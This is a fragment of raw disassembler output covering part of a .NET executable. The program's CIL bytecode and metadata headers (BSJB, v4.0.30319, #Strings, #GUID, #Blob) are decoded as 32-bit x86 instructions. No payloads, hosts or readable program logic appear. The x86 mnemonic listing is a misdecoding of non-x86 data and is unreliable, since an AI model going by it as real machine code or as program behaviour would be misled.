  4035e1:	0a 0a                	or     (%edx),%cl
  4035e3:	06                   	push   %es
  4035e4:	25 6f 95 00 00       	and    $0x956f,%eax
  4035e9:	0a 20                	or     (%eax),%ah
  4035eb:	80 00 00             	addb   $0x0,(%eax)
  4035ee:	00 60 6f             	add    %ah,0x6f(%eax)
  4035f1:	96                   	xchg   %eax,%esi
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	0a 06                	or     (%esi),%al
  4035f6:	2a 1e                	sub    (%esi),%bl
  4035f8:	02 28                	add    (%eax),%ch
  4035fa:	2c 00                	sub    $0x0,%al
  4035fc:	00 0a                	add    %cl,(%edx)
  4035fe:	2a 32                	sub    (%edx),%dh
  403600:	02 28                	add    (%eax),%ch
  403602:	97                   	xchg   %eax,%edi
  403603:	00 00                	add    %al,(%eax)
  403605:	0a 7d 2e             	or     0x2e(%ebp),%bh
  403608:	00 00                	add    %al,(%eax)
  40360a:	04 2a                	add    $0x2a,%al
  40360c:	13 30                	adc    (%eax),%esi
  40360e:	02 00                	add    (%eax),%al
  403610:	3d 00 00 00 1d       	cmp    $0x1d000000,%eax
  403615:	00 00                	add    %al,(%eax)
  403617:	11 73 38             	adc    %esi,0x38(%ebx)
  40361a:	00 00                	add    %al,(%eax)
  40361c:	06                   	push   %es
  40361d:	0b 07                	or     (%edi),%eax
  40361f:	7e 98                	jle    0x4035b9
  403621:	00 00                	add    %al,(%eax)
  403623:	0a 7d 2e             	or     0x2e(%ebp),%bh
  403626:	00 00                	add    %al,(%eax)
  403628:	04 07                	add    $0x7,%al
  40362a:	fe 06                	incb   (%esi)
  40362c:	39 00                	cmp    %eax,(%eax)
  40362e:	00 06                	add    %al,(%esi)
  403630:	73 07                	jae    0x403639
  403632:	00 00                	add    %al,(%eax)
  403634:	0a 73 08             	or     0x8(%ebx),%dh
  403637:	00 00                	add    %al,(%eax)
  403639:	0a 0a                	or     (%edx),%cl
  40363b:	06                   	push   %es
  40363c:	16                   	push   %ss
  40363d:	6f                   	outsl  %ds:(%esi),(%dx)
  40363e:	99                   	cltd
  40363f:	00 00                	add    %al,(%eax)
  403641:	0a 06                	or     (%esi),%al
  403643:	6f                   	outsl  %ds:(%esi),(%dx)
  403644:	09 00                	or     %eax,(%eax)
  403646:	00 0a                	add    %cl,(%edx)
  403648:	06                   	push   %es
  403649:	6f                   	outsl  %ds:(%esi),(%dx)
  40364a:	9a 00 00 0a 07 7b 2e 	lcall  $0x2e7b,$0x70a0000
  403651:	00 00                	add    %al,(%eax)
  403653:	04 2a                	add    $0x2a,%al
  403655:	1e                   	push   %ds
  403656:	02 28                	add    (%eax),%ch
  403658:	2c 00                	sub    $0x0,%al
  40365a:	00 0a                	add    %cl,(%edx)
  40365c:	2a 32                	sub    (%edx),%dh
  40365e:	02 7b 2f             	add    0x2f(%ebx),%bh
  403661:	00 00                	add    %al,(%eax)
  403663:	04 28                	add    $0x28,%al
  403665:	9b                   	fwait
  403666:	00 00                	add    %al,(%eax)
  403668:	0a 2a                	or     (%edx),%ch
  40366a:	00 00                	add    %al,(%eax)
  40366c:	13 30                	adc    (%eax),%esi
  40366e:	02 00                	add    (%eax),%al
  403670:	33 00                	xor    (%eax),%eax
  403672:	00 00                	add    %al,(%eax)
  403674:	1e                   	push   %ds
  403675:	00 00                	add    %al,(%eax)
  403677:	11 73 3a             	adc    %esi,0x3a(%ebx)
  40367a:	00 00                	add    %al,(%eax)
  40367c:	06                   	push   %es
  40367d:	0b 07                	or     (%edi),%eax
  40367f:	02 7d 2f             	add    0x2f(%ebp),%bh
  403682:	00 00                	add    %al,(%eax)
  403684:	04 07                	add    $0x7,%al
  403686:	fe 06                	incb   (%esi)
  403688:	3b 00                	cmp    (%eax),%eax
  40368a:	00 06                	add    %al,(%esi)
  40368c:	73 07                	jae    0x403695
  40368e:	00 00                	add    %al,(%eax)
  403690:	0a 73 08             	or     0x8(%ebx),%dh
  403693:	00 00                	add    %al,(%eax)
  403695:	0a 0a                	or     (%edx),%cl
  403697:	06                   	push   %es
  403698:	16                   	push   %ss
  403699:	6f                   	outsl  %ds:(%esi),(%dx)
  40369a:	99                   	cltd
  40369b:	00 00                	add    %al,(%eax)
  40369d:	0a 06                	or     (%esi),%al
  40369f:	6f                   	outsl  %ds:(%esi),(%dx)
  4036a0:	09 00                	or     %eax,(%eax)
  4036a2:	00 0a                	add    %cl,(%edx)
  4036a4:	06                   	push   %es
  4036a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4036a6:	9a 00 00 0a 2a 2e 28 	lcall  $0x282e,$0x2a0a0000
  4036ad:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4036b2:	23 00                	and    (%eax),%eax
  4036b4:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4036b7:	00 42 53             	add    %al,0x53(%edx)
  4036ba:	4a                   	dec    %edx
  4036bb:	42                   	inc    %edx
  4036bc:	01 00                	add    %eax,(%eax)
  4036be:	01 00                	add    %eax,(%eax)
  4036c0:	00 00                	add    %al,(%eax)
  4036c2:	00 00                	add    %al,(%eax)
  4036c4:	0c 00                	or     $0x0,%al
  4036c6:	00 00                	add    %al,(%eax)
  4036c8:	76 34                	jbe    0x4036fe
  4036ca:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4036cd:	33 30                	xor    (%eax),%esi
  4036cf:	33 31                	xor    (%ecx),%esi
  4036d1:	39 00                	cmp    %eax,(%eax)
  4036d3:	00 00                	add    %al,(%eax)
  4036d5:	00 05 00 6c 00 00    	add    %al,0x6c00
  4036db:	00 1c 0d 00 00 23 7e 	add    %bl,0x7e230000(,%ecx,1)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	88 0d 00 00 84 11    	mov    %cl,0x11840000
  4036ea:	00 00                	add    %al,(%eax)
  4036ec:	23 53 74             	and    0x74(%ebx),%edx
  4036ef:	72 69                	jb     0x40375a
  4036f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4036f2:	67 73 00             	addr16 jae 0x4036f5
  4036f5:	00 00                	add    %al,(%eax)
  4036f7:	00 0c 1f             	add    %cl,(%edi,%ebx,1)
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	40                   	inc    %eax
  4036fd:	11 00                	adc    %eax,(%eax)
  4036ff:	00 23                	add    %ah,(%ebx)
  403701:	55                   	push   %ebp
  403702:	53                   	push   %ebx
  403703:	00 4c 30 00          	add    %cl,0x0(%eax,%esi,1)
  403707:	00 10                	add    %dl,(%eax)
  403709:	00 00                	add    %al,(%eax)
  40370b:	00 23                	add    %ah,(%ebx)
  40370d:	47                   	inc    %edi
  40370e:	55                   	push   %ebp
  40370f:	49                   	dec    %ecx
  403710:	44                   	inc    %esp
  403711:	00 00                	add    %al,(%eax)
  403713:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  403717:	00 28                	add    %ch,(%eax)
  403719:	04 00                	add    $0x0,%al
  40371b:	00 23                	add    %ah,(%ebx)
  40371d:	42                   	inc    %edx
  40371e:	6c                   	insb   (%dx),%es:(%edi)
  40371f:	6f                   	outsl  %ds:(%esi),(%dx)
  403720:	62 00                	bound  %eax,(%eax)
  403722:	00 00                	add    %al,(%eax)
  403724:	00 00                	add    %al,(%eax)
  403726:	00 00                	add    %al,(%eax)
  403728:	02 00                	add    (%eax),%al
  40372a:	00 01                	add    %al,(%ecx)
  40372c:	57                   	push   %edi
  40372d:	3d a2 3d 09 0a       	cmp    $0xa093da2,%eax
  403732:	00 00                	add    %al,(%eax)
  403734:	00 fa                	add    %bh,%dl
  403736:	25 33 00 16 00       	and    $0x160033,%eax
  40373b:	00 01                	add    %al,(%ecx)
  40373d:	00 00                	add    %al,(%eax)
  40373f:	00 52 00             	add    %dl,0x0(%edx)
  403742:	00 00                	add    %al,(%eax)
  403744:	0c 00                	or     $0x0,%al
  403746:	00 00                	add    %al,(%eax)
  403748:	2f                   	das
  403749:	00 00                	add    %al,(%eax)
  40374b:	00 3b                	add    %bh,(%ebx)
  40374d:	00 00                	add    %al,(%eax)
  40374f:	00 23                	add    %ah,(%ebx)
  403751:	00 00                	add    %al,(%eax)
  403753:	00 9b 00 00 00 01    	add    %bl,0x1000000(%ebx)
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 0a                	add    %cl,(%edx)
  40375d:	00 00                	add    %al,(%eax)
  40375f:	00 01                	add    %al,(%ecx)
  403761:	00 00                	add    %al,(%eax)
  403763:	00 1e                	add    %bl,(%esi)
  403765:	00 00                	add    %al,(%eax)
  403767:	00 01                	add    %al,(%ecx)
  403769:	00 00                	add    %al,(%eax)
  40376b:	00 01                	add    %al,(%ecx)
  40376d:	00 00                	add    %al,(%eax)
  40376f:	00 01                	add    %al,(%ecx)
  403771:	00 00                	add    %al,(%eax)
  403773:	00 01                	add    %al,(%ecx)
  403775:	00 00                	add    %al,(%eax)
  403777:	00 03                	add    %al,(%ebx)
  403779:	00 00                	add    %al,(%eax)
  40377b:	00 03                	add    %al,(%ebx)
  40377d:	00 00                	add    %al,(%eax)
  40377f:	00 01                	add    %al,(%ecx)
  403781:	00 00                	add    %al,(%eax)
  403783:	00 01                	add    %al,(%ecx)
  403785:	00 00                	add    %al,(%eax)
  403787:	00 04 00             	add    %al,(%eax,%eax,1)
  40378a:	00 00                	add    %al,(%eax)
  40378c:	08 00                	or     %al,(%eax)
  40378e:	00 00                	add    %al,(%eax)
  403790:	01 00                	add    %eax,(%eax)
  403792:	00 00                	add    %al,(%eax)
  403794:	00 00                	add    %al,(%eax)
  403796:	0a 00                	or     (%eax),%al
  403798:	01 00                	add    %eax,(%eax)
  40379a:	00 00                	add    %al,(%eax)
  40379c:	00 00                	add    %al,(%eax)
  40379e:	06                   	push   %es
  40379f:	00 70 00             	add    %dh,0x0(%eax)
  4037a2:	69 00 0a 00 8c 00    	imul   $0x8c000a,(%eax),%eax
  4037a8:	77 00                	ja     0x4037aa
  4037aa:	0e                   	push   %cs
  4037ab:	00 52 02             	add    %dl,0x2(%edx)
  4037ae:	33 02                	xor    (%edx),%eax
  4037b0:	06                   	push   %es
  4037b1:	00 81 02 66 02 06    	add    %al,0x6026602(%ecx)
  4037b7:	00 02                	add    %al,(%edx)
  4037b9:	03 69 00             	add    0x0(%ecx),%ebp
  4037bc:	0a 00                	or     (%eax),%al
  4037be:	ff 04 77             	incl   (%edi,%esi,2)
  4037c1:	00 0a                	add    %cl,(%edx)
  4037c3:	00 0f                	add    %cl,(%edi)
  4037c5:	05 77 00 06 00       	add    $0x60077,%eax
  4037ca:	f5                   	cmc
  4037cb:	05 d6 05 06 00       	add    $0x605d6,%eax
  4037d0:	08 06                	or     %al,(%esi)
  4037d2:	d6                   	salc
  4037d3:	05 06 00 61 06       	add    $0x6610006,%eax
  4037d8:	41                   	inc    %ecx
  4037d9:	06                   	push   %es
  4037da:	06                   	push   %es
  4037db:	00 81 06 41 06 06    	add    %al,0x6064106(%ecx)
  4037e1:	00 a4 06 d6 05 06 00 	add    %ah,0x605d6(%esi,%eax,1)
  4037e8:	de 06                	fiadds (%esi)
  4037ea:	cd 06                	int    $0x6
  4037ec:	06                   	push   %es
  4037ed:	00 11                	add    %dl,(%ecx)
  4037ef:	07                   	pop    %es
  4037f0:	41                   	inc    %ecx
  4037f1:	06                   	push   %es
  4037f2:	0a 00                	or     (%eax),%al
  4037f4:	2c 07                	sub    $0x7,%al
  4037f6:	77 00                	ja     0x4037f8
  4037f8:	0a 00                	or     (%eax),%al
  4037fa:	37                   	aaa
  4037fb:	07                   	pop    %es
  4037fc:	77 00                	ja     0x4037fe
  4037fe:	06                   	push   %es
  4037ff:	00 49 07             	add    %cl,0x7(%ecx)
  403802:	cd 06                	int    $0x6
  403804:	06                   	push   %es
  403805:	00 56 07             	add    %dl,0x7(%esi)
  403808:	69 00 0a 00 67 07    	imul   $0x767000a,(%eax),%eax
  40380e:	77 00                	ja     0x403810
  403810:	06                   	push   %es
  403811:	00 73 07             	add    %dh,0x7(%ebx)
  403814:	69 00 0a 00 7a 07    	imul   $0x77a000a,(%eax),%eax
  40381a:	77 00                	ja     0x40381c
  40381c:	06                   	push   %es
  40381d:	00 b6 07 a1 07 06    	add    %dh,0x607a107(%esi)
  403823:	00 f5                	add    %dh,%ch
  403825:	07                   	pop    %es
  403826:	e3 07                	jecxz  0x40382f
  403828:	06                   	push   %es
  403829:	00 26                	add    %ah,(%esi)
  40382b:	08 1c 08             	or     %bl,(%eax,%ecx,1)
  40382e:	4b                   	dec    %ebx
  40382f:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  403832:	00 00                	add    %al,(%eax)
  403834:	06                   	push   %es
  403835:	00 7c 08 6c          	add    %bh,0x6c(%eax,%ecx,1)
  403839:	08 06                	or     %al,(%esi)
  40383b:	00 85 08 6c 08 06    	add    %al,0x6086c08(%ebp)
  403841:	00 d4                	add    %dl,%ah
  403843:	08 69 00             	or     %ch,0x0(%ecx)
  403846:	0e                   	push   %cs
  403847:	00 fb                	add    %bh,%bl
  403849:	08 e8                	or     %ch,%al
  40384b:	08 0e                	or     %cl,(%esi)
  40384d:	00 22                	add    %ah,(%edx)
  40384f:	09 e8                	or     %ebp,%eax
  403851:	08 0e                	or     %cl,(%esi)
  403853:	00 46 09             	add    %al,0x9(%esi)
  403856:	e8 08 06 00 86       	call   0x86403e63
  40385b:	09 69 00             	or     %ebp,0x0(%ecx)
  40385e:	06                   	push   %es
  40385f:	00 9c 09 90 09 06 00 	add    %bl,0x60990(%ecx,%ecx,1)
  403866:	c0 09 90             	rorb   $0x90,(%ecx)
  403869:	09 06                	or     %eax,(%esi)
  40386b:	00 db                	add    %bl,%bl
  40386d:	09 69 00             	or     %ebp,0x0(%ecx)
  403870:	06                   	push   %es
  403871:	00 e3                	add    %ah,%bl
  403873:	0a 69 00             	or     0x0(%ecx),%ch
  403876:	06                   	push   %es
  403877:	00 ef                	add    %ch,%bh
  403879:	0a 69 00             	or     0x0(%ecx),%ch
  40387c:	06                   	push   %es
  40387d:	00 fc                	add    %bh,%ah
  40387f:	0a 1c 08             	or     (%eax,%ecx,1),%bl
  403882:	06                   	push   %es
  403883:	00 05 0b 1c 08 06    	add    %al,0x6081c0b
  403889:	00 14 0b             	add    %dl,(%ebx,%ecx,1)
  40388c:	1c 08                	sbb    $0x8,%al
  40388e:	06                   	push   %es
  40388f:	00 32                	add    %dh,(%edx)
  403891:	0b 1c 08             	or     (%eax,%ecx,1),%ebx
  403894:	06                   	push   %es
  403895:	00 37                	add    %dh,(%edi)
  403897:	0b 66 02             	or     0x2(%esi),%esp
  40389a:	06                   	push   %es
  40389b:	00 53 0b             	add    %dl,0xb(%ebx)
  40389e:	1c 08                	sbb    $0x8,%al
  4038a0:	06                   	push   %es
  4038a1:	00 70 0b             	add    %dh,0xb(%eax)
  4038a4:	1c 08                	sbb    $0x8,%al
  4038a6:	06                   	push   %es
  4038a7:	00 83 0b 69 00 06    	add    %al,0x600690b(%ebx)
  4038ad:	00 a3 0b 8c 0b 06    	add    %ah,0x60b8c0b(%ebx)
  4038b3:	00 ac 0b 8c 0b 06 00 	add    %ch,0x60b8c(%ebx,%ecx,1)
  4038ba:	e6 0b                	out    %al,$0xb
  4038bc:	69 00 06 00 44 0c    	imul   $0xc440006,(%eax),%eax
  4038c2:	41                   	inc    %ecx
  4038c3:	06                   	push   %es
  4038c4:	06                   	push   %es
  4038c5:	00 53 0c             	add    %dl,0xc(%ebx)
  4038c8:	69 00 06 00 76 0c    	imul   $0xc760006,(%eax),%eax
  4038ce:	1c 08                	sbb    $0x8,%al
  4038d0:	06                   	push   %es
  4038d1:	00 81 0c 1c 08 06    	add    %al,0x6081c0c(%ecx)
  4038d7:	00 a7 0c 8a 0c 06    	add    %ah,0x60c8a0c(%edi)
  4038dd:	00 b7 0c 8a 0c 06    	add    %dh,0x60c8a0c(%edi)
  4038e3:	00 e4                	add    %ah,%ah
  4038e5:	0c 8a                	or     $0x8a,%al
  4038e7:	0c 06                	or     $0x6,%al
  4038e9:	00 fc                	add    %bh,%ah
  4038eb:	0c 8a                	or     $0x8a,%al
  4038ed:	0c 06                	or     $0x6,%al
  4038ef:	00 1b                	add    %bl,(%ebx)
  4038f1:	0d 8a 0c 06 00       	or     $0x60c8a,%eax
  4038f6:	44                   	inc    %esp
  4038f7:	0d 8a 0c 06 00       	or     $0x60c8a,%eax
  4038fc:	58                   	pop    %eax
  4038fd:	0d 1c 08 06 00       	or     $0x6081c,%eax
  403902:	65 0d 8a 0c 06 00    	gs or  $0x60c8a,%eax
  403908:	86 0d 8a 0c 06 00    	xchg   %cl,0x60c8a
  40390e:	93                   	xchg   %eax,%ebx
  40390f:	0d 8a 0c 06 00       	or     $0x60c8a,%eax
  403914:	b1 0d                	mov    $0xd,%cl
  403916:	1c 08                	sbb    $0x8,%al
  403918:	06                   	push   %es
  403919:	00 bc 0d 1c 08 06 00 	add    %bh,0x6081c(%ebp,%ecx,1)
  403920:	c9                   	leave
  403921:	0d 1c 08 06 00       	or     $0x6081c,%eax
  403926:	e8 0d 1c 08 06       	call   0x6485538
  40392b:	00 fc                	add    %bh,%ah
  40392d:	0d 8a 0c 06 00       	or     $0x60c8a,%eax
  403932:	15 0e 8a 0c 06       	adc    $0x60c8a0e,%eax
  403937:	00 2b                	add    %ch,(%ebx)
  403939:	0e                   	push   %cs
  40393a:	8a 0c 06             	mov    (%esi,%eax,1),%cl
  40393d:	00 44 0e 8a          	add    %al,-0x76(%esi,%ecx,1)
  403941:	0c 06                	or     $0x6,%al
  403943:	00 b6 0e 1c 08 06    	add    %dh,0x6081c0e(%esi)
  403949:	00 ea                	add    %ch,%dl
  40394b:	0e                   	push   %cs
  40394c:	69 00 0e 00 32 0f    	imul   $0xf32000e,(%eax),%eax
  403952:	e8 08 0e 00 83       	call   0x8340475f
  403957:	0f e8 08             	psubsb (%eax),%mm1
  40395a:	0e                   	push   %cs
  40395b:	00 bc 0f a6 0f 12 00 	add    %bh,0x120fa6(%edi,%ecx,1)
  403962:	57                   	push   %edi
  403963:	10 41 10             	adc    %al,0x10(%ecx)
  403966:	06                   	push   %es
  403967:	00 a3 10 69 00 0a    	add    %ah,0xa006910(%ebx)
  40396d:	00 aa 10 77 00 0e    	add    %ch,0xe007710(%edx)
  403973:	00 bd 10 33 02 0e    	add    %bh,0xe023310(%ebp)
  403979:	00 c3                	add    %al,%bl
  40397b:	10 33                	adc    %dh,(%ebx)
  40397d:	02 0a                	add    (%edx),%cl
  40397f:	00 2d 11 77 00 06    	add    %ch,0x6007711
  403985:	00 3d 11 cd 06 00    	add    %bh,0x6cd11
  40398b:	00 00                	add    %al,(%eax)
  40398d:	00 01                	add    %al,(%ecx)
  40398f:	00 00                	add    %al,(%eax)
  403991:	00 00                	add    %al,(%eax)
  403993:	00 01                	add    %al,(%ecx)
  403995:	00 01                	add    %al,(%ecx)
  403997:	00 00                	add    %al,(%eax)
  403999:	00 10                	add    %dl,(%eax)
  40399b:	00 13                	add    %dl,(%ebx)
  40399d:	00 1b                	add    %bl,(%ebx)
  40399f:	00 05 00 01 00 01    	add    %al,0x1000100
  4039a5:	00 82 01 10 00 2f    	add    %al,0x2f001001(%edx)
  4039ab:	00 00                	add    %al,(%eax)
  4039ad:	00 05 00 21 00 25    	add    %al,0x25002100
  4039b3:	00 01                	add    %al,(%ecx)
  4039b5:	01 10                	add    %edx,(%eax)
  4039b7:	00 3d 00 1b 00 05    	add    %bh,0x5001b00
  4039bd:	00 23                	add    %ah,(%ebx)
  4039bf:	00 28                	add    %ch,(%eax)
  4039c1:	00 02                	add    %al,(%edx)
  4039c3:	00 10                	add    %dl,(%eax)
  4039c5:	00 4f 00             	add    %cl,0x0(%edi)
  4039c8:	00 00                	add    %al,(%eax)
  4039ca:	09 00                	or     %eax,(%eax)
  4039cc:	23 00                	and    (%eax),%eax
  4039ce:	29 00                	sub    %eax,(%eax)
  4039d0:	03 01                	add    (%ecx),%eax
  4039d2:	10 00                	adc    %al,(%eax)
  4039d4:	f2 09 00             	repnz or %eax,(%eax)
  4039d7:	00 05 00 24 00 30    	add    %al,0x30002400
  4039dd:	00 03                	add    %al,(%ebx)
  4039df:	01 10                	add    %edx,(%eax)
  4039e1:	00 05 0a 00 00 05    	add    %al,0x500000a
  4039e7:	00 25 00 31 00 03    	add    %ah,0x3003100
  4039ed:	01 10                	add    %edx,(%eax)
  4039ef:	00 18                	add    %bl,(%eax)
  4039f1:	0a 00                	or     (%eax),%al
  4039f3:	00 05 00 29 00 34    	add    %al,0x34002900
  4039f9:	00 00                	add    %al,(%eax)
  4039fb:	00 00                	add    %al,(%eax)
  4039fd:	00 eb                	add    %ch,%bl
  4039ff:	0b 00                	or     (%eax),%eax
  403a01:	00 05 00 2c 00 36    	add    %al,0x36002c00
  403a07:	00 03                	add    %al,(%ebx)
  403a09:	01 10                	add    %edx,(%eax)
  403a0b:	00 82 0e 00 00 05    	add    %al,0x500000e(%edx)
  403a11:	00 2d 00 36 00 03    	add    %ch,0x3003600
  403a17:	01 10                	add    %edx,(%eax)
  403a19:	00 00                	add    %al,(%eax)
  403a1b:	11 00                	adc    %eax,(%eax)
  403a1d:	00 05 00 2e 00 38    	add    %al,0x38002e00
  403a23:	00 03                	add    %al,(%ebx)
  403a25:	01 10                	add    %edx,(%eax)
  403a27:	00 63 11             	add    %ah,0x11(%ebx)
  403a2a:	00 00                	add    %al,(%eax)
  403a2c:	05 00 2f 00 3a       	add    $0x3a002f00,%eax
  403a31:	00 31                	add    %dh,(%ecx)
  403a33:	00 91 00 0a 00 11    	add    %dl,0x11000a00(%ecx)
  403a39:	00 97 00 0e 00 11    	add    %dl,0x11000e00(%edi)
  403a3f:	00 a0 00 0e 00 16    	add    %ah,0x16000e00(%eax)
  403a45:	00 a8 00 0e 00 16    	add    %ch,0x16000e00(%eax)
  403a4b:	00 b4 00 11 00 16 00 	add    %dh,0x160011(%eax,%eax,1)
  403a52:	c5 00                	lds    (%eax),%eax
  403a54:	0e                   	push   %cs
  403a55:	00 11                	add    %dl,(%ecx)
  403a57:	00 dc                	add    %bl,%ah
  403a59:	00 11                	add    %dl,(%ecx)
  403a5b:	00 11                	add    %dl,(%ecx)
  403a5d:	00 e8                	add    %ch,%al
  403a5f:	00 0e                	add    %cl,(%esi)
  403a61:	00 11                	add    %dl,(%ecx)
  403a63:	00 f3                	add    %dh,%bl
  403a65:	00 11                	add    %dl,(%ecx)
  403a67:	00 11                	add    %dl,(%ecx)
  403a69:	00 04 01             	add    %al,(%ecx,%eax,1)
  403a6c:	0e                   	push   %cs
  403a6d:	00 16                	add    %dl,(%esi)
  403a6f:	00 10                	add    %dl,(%eax)
  403a71:	01 0e                	add    %ecx,(%esi)
  403a73:	00 11                	add    %dl,(%ecx)
  403a75:	00 1d 01 11 00 11    	add    %bl,0x11001101
  403a7b:	00 30                	add    %dh,(%eax)
  403a7d:	01 11                	add    %edx,(%ecx)
  403a7f:	00 11                	add    %dl,(%ecx)
  403a81:	00 3b                	add    %bh,(%ebx)
  403a83:	01 14 00             	add    %edx,(%eax,%eax,1)
  403a86:	11 00                	adc    %eax,(%eax)
  403a88:	48                   	dec    %eax
  403a89:	01 0e                	add    %ecx,(%esi)
  403a8b:	00 16                	add    %dl,(%esi)
  403a8d:	00 54 01 0e          	add    %dl,0xe(%ecx,%eax,1)
  403a91:	00 11                	add    %dl,(%ecx)
  403a93:	00 64 01 0e          	add    %ah,0xe(%ecx,%eax,1)
  403a97:	00 11                	add    %dl,(%ecx)
  403a99:	00 7a 01             	add    %bh,0x1(%edx)
  403a9c:	11 00                	adc    %eax,(%eax)
  403a9e:	11 00                	adc    %eax,(%eax)
  403aa0:	8e 01                	mov    (%ecx),%es
  403aa2:	11 00                	adc    %eax,(%eax)
  403aa4:	11 00                	adc    %eax,(%eax)
  403aa6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403aa7:	01 11                	add    %edx,(%ecx)
  403aa9:	00 11                	add    %dl,(%ecx)
  403aab:	00 bf 01 11 00 11    	add    %bh,0x11001101(%edi)
  403ab1:	00 d8                	add    %bl,%al
  403ab3:	01 11                	add    %edx,(%ecx)
  403ab5:	00 11                	add    %dl,(%ecx)
  403ab7:	00 eb                	add    %ch,%bl
  403ab9:	01 11                	add    %edx,(%ecx)
  403abb:	00 16                	add    %dl,(%esi)
  403abd:	00 03                	add    %al,(%ebx)
  403abf:	02 0e                	add    (%esi),%cl
  403ac1:	00 16                	add    %dl,(%esi)
  403ac3:	00 14 02             	add    %dl,(%edx,%eax,1)
  403ac6:	0e                   	push   %cs
  403ac7:	00 16                	add    %dl,(%esi)
  403ac9:	00 1e                	add    %bl,(%esi)
  403acb:	02 0e                	add    (%esi),%cl
  403acd:	00 16                	add    %dl,(%esi)
  403acf:	00 2a                	add    %ch,(%edx)
  403ad1:	02 0e                	add    (%esi),%cl
  403ad3:	00 36                	add    %dh,(%esi)
  403ad5:	00 58 02             	add    %bl,0x2(%eax)
  403ad8:	17                   	pop    %ss
  403ad9:	00 11                	add    %dl,(%ecx)
  403adb:	00 88 02 1b 00 11    	add    %cl,0x11001b02(%eax)
  403ae1:	00 91 02 22 00 11    	add    %dl,0x11002202(%ecx)
  403ae7:	00 09                	add    %cl,(%ecx)
  403ae9:	03 3c 00             	add    (%eax,%eax,1),%edi
  403aec:	11 00                	adc    %eax,(%eax)
  403aee:	ea 06 b1 00 56 80 af 	ljmp   $0xaf80,$0x5600b106
  403af5:	04 14                	add    $0x14,%al
  403af7:	00 16                	add    %dl,(%esi)
  403af9:	00 d8                	add    %bl,%al
  403afb:	04 85                	add    $0x85,%al
  403afd:	00 11                	add    %dl,(%ecx)
  403aff:	00 e2                	add    %ah,%dl
  403b01:	04 0e                	add    $0xe,%al
  403b03:	00 06                	add    %al,(%esi)
  403b05:	00 6f 05             	add    %ch,0x5(%edi)
  403b08:	0e                   	push   %cs
  403b09:	00 06                	add    %al,(%esi)
  403b0b:	00 2b                	add    %ch,(%ebx)
  403b0d:	0a 78 01             	or     0x1(%eax),%bh
  403b10:	06                   	push   %es
  403b11:	00 3b                	add    %bh,(%ebx)
  403b13:	0a 22                	or     (%edx),%ah
  403b15:	00 06                	add    %al,(%esi)
  403b17:	00 41 0a             	add    %al,0xa(%ecx)
  403b1a:	11 00                	adc    %eax,(%eax)
  403b1c:	06                   	push   %es
  403b1d:	00 4e 0a             	add    %cl,0xa(%esi)
  403b20:	22 00                	and    (%eax),%al
  403b22:	06                   	push   %es
  403b23:	00 8d 0a 7c 01 06    	add    %cl,0x6017c0a(%ebp)
  403b29:	00 2b                	add    %ch,(%ebx)
  403b2b:	0a 78 01             	or     0x1(%eax),%bh
  403b2e:	06                   	push   %es
  403b2f:	00 9d 0a 0e 00 13    	add    %bl,0x13000e0a(%ebp)
  403b35:	01 30                	add    %esi,(%eax)
  403b37:	0c 1d                	or     $0x1d,%al
  403b39:	02 06                	add    (%esi),%al
  403b3b:	00 95 0e 0e 00 06    	add    %dl,0x6000e0e(%ebp)
  403b41:	00 13                	add    %dl,(%ebx)
  403b43:	11 0e                	adc    %ecx,(%esi)
  403b45:	00 06                	add    %al,(%esi)
  403b47:	00 3d 06 0e 00 00    	add    %bh,0xe06
  403b4d:	00 00                	add    %al,(%eax)
  403b4f:	00 80 00 91 20 a1    	add    %al,-0x5edf6f00(%eax)
  403b55:	02 26                	add    (%esi),%ah
  403b57:	00 01                	add    %al,(%ecx)
  403b59:	00 58 20             	add    %bl,0x20(%eax)
  403b5c:	00 00                	add    %al,(%eax)
  403b5e:	00 00                	add    %al,(%eax)
  403b60:	91                   	xchg   %eax,%ecx
  403b61:	00 b6 02 2e 00 05    	add    %dh,0x5002e02(%esi)
  403b67:	00 5f 21             	add    %bl,0x21(%edi)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	00 00                	add    %al,(%eax)
  403b6e:	96                   	xchg   %eax,%esi
  403b6f:	00 bb 02 34 00 06    	add    %bh,0x6003402(%ebx)
  403b75:	00 6c 21 00          	add    %ch,0x0(%ecx,%eiz,1)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 91 00 bf 02 38    	add    %dl,0x3802bf00(%ecx)
  403b81:	00 06                	add    %al,(%esi)
  403b83:	00 e8                	add    %ch,%al
  403b85:	21 00                	and    %eax,(%eax)
  403b87:	00 00                	add    %al,(%eax)
  403b89:	00 91 00 d0 02 34    	add    %dl,0x3402d000(%ecx)
  403b8f:	00 06                	add    %al,(%esi)
  403b91:	00 28                	add    %ch,(%eax)
  403b93:	22 00                	and    (%eax),%al
  403b95:	00 00                	add    %al,(%eax)
  403b97:	00 91 00 e5 02 38    	add    %dl,0x3802e500(%ecx)
  403b9d:	00 06                	add    %al,(%esi)
  403b9f:	00 a4 22 00 00 00 00 	add    %ah,0x0(%edx,%eiz,1)
  403ba6:	91                   	xchg   %eax,%ecx
  403ba7:	00 f3                	add    %dh,%bl
  403ba9:	02 38                	add    (%eax),%bh
  403bab:	00 06                	add    %al,(%esi)
  403bad:	00 28                	add    %ch,(%eax)
  403baf:	23 00                	and    (%eax),%eax
  403bb1:	00 00                	add    %al,(%eax)
  403bb3:	00 96 00 10 03 40    	add    %dl,0x40031000(%esi)
  403bb9:	00 06                	add    %al,(%esi)
  403bbb:	00 78 23             	add    %bh,0x23(%eax)
  403bbe:	00 00                	add    %al,(%eax)
  403bc0:	00 00                	add    %al,(%eax)
  403bc2:	96                   	xchg   %eax,%esi
  403bc3:	00 1d 03 40 00 07    	add    %bl,0x7004003
  403bc9:	00 dc                	add    %bl,%ah
  403bcb:	23 00                	and    (%eax),%eax
  403bcd:	00 00                	add    %al,(%eax)
  403bcf:	00 96 00 36 03 45    	add    %dl,0x45033600(%esi)
  403bd5:	00 08                	add    %cl,(%eax)
